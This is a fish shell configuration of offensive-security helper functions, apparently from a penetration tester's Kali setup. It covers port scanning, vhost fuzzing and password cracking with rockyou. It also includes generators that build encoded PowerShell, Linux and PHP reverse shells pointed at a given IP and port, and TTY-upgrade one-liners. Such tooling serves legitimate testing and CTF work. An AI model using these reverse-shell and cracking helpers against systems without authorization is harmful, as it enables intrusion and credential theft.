# Misc
function list_ips
  ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "[\033[96m" iface"\033[0m] "a[1] }'
end

function ls_pwd
  echo -e "[\e[96m`pwd`\e[0m]\e[34m" && ls && echo -en "\e[0m"
end

function take
  mkdir $1 && cd $_
end

abbr -a tun0 "ifconfig tun0 | grep 'inet ' | cut -d' ' -f10 | tr -d '\n' | xclip -sel clip"
abbr -a www "list_ips && ls_pwd && tun0 && sudo python3 -m http.server 80"

# Hashcracking
function rick -d "[i] Usage: rock_john wordlist (options)" -w john -a hash_file
  if test $(count $argv) -eq 0
      echo "[i] Usage: rock_john wordlist (options)"
    else
      john $hash_file --wordlist=/usr/share/wordlists/rockyou.txt
  end
end

# Portscanning
function nmap_default -d "[i] Usage: nmap_default ip (options)" -w nmap -a ip
  if test $(count $argv) -eq 0
      echo "[i] Usage: nmap_default ip (options)"
    else
      [ ! -d "./nmap" ] && echo "[i] Creating $(pwd)/nmap..." && mkdir nmap
      sudo nmap -sCV -T4 --min-rate 10000 $ip -v -oA nmap/tcp_default
  end
end

function nmap_udp -d "[i] Usage: nmap_udp ip (options)" -w nmap -a ip
  if test $(count $argv) -eq 0
      echo "[i] Usage: nmap_udp ip (options)"
    else
      [ ! -d "./nmap" ] && echo "[i] Creating $(pwd)/nmap..." && mkdir nmap
      sudo nmap -sUCV -T4 --min-rate 10000 $ip -v -oA nmap/udp_default
  end
end

# Web enum

function scan_vhost -d "[i] Usage: scan_vhosts host (options)" -w ffuf -a host_name
  if test $(count $argv) -eq 0
    echo "[i] Usage: scan_vhosts host (options)"
  else
    ffuf -u http://$host_name/ -H "Host: FUZZ."$host_name -w /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt
  end
end  

# # Reverse shells

function gen_ps_rev -d "[i] Usage: gen_ps_rev ip port" -a ip -a port
  if test $(count $argv) -ne 2
    echo "[i] Usage: gen_ps_rev ip port"
  else
    SHELL=`cat /home/kali/.config/fish/fish-aliases/shells/ps_rev.txt | sed s/x.x.x.x/$ip/g | sed s/yyyy/$port/g | iconv -f utf8 -t utf16le | base64 -w 0`
    echo "powershell -ec $SHELL" | xclip -sel clip    
  end
end

function gen_lin_rev -d "[i]: Usage: gen_lin_rev ip port" -a ip -a port
  if test $(count $argv) -ne 2
    echo "[i] Usage: gen_lin_rev ip port"
  else
    /home/kali/.config/fish/fish-aliases/shells/gen_lin_rev $ip $port
  end
end

function gen_php_rev -d "[i]: Usage: gen_php_rev ip port" -a ip -a port
  if test $(count $argv) -ne 2
    echo "[i] Usage: gen_php_rev ip port"
  else
    /home/kali/.config/fish/fish-aliases/shells/gen_php_rev $ip $port
  end
end


function py_tty_upgrade
  echo "python -c 'import pty;pty.spawn(\"/bin/bash\")'"| xclip -sel clip
end

function py3_tty_upgrade
  echo "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"| xclip -sel clip
end

abbr -a script_tty_upgrade "echo '/usr/bin/script -qc /bin/bash /dev/null'| xclip -sel clip"
abbr -a tty_fix "stty raw -echo; fg; reset"
abbr -a tty_conf "stty -a | sed 's/;//g' | head -n 1 | sed 's/.*baud /stty /g;s/line.*//g' | xclip -sel clip"
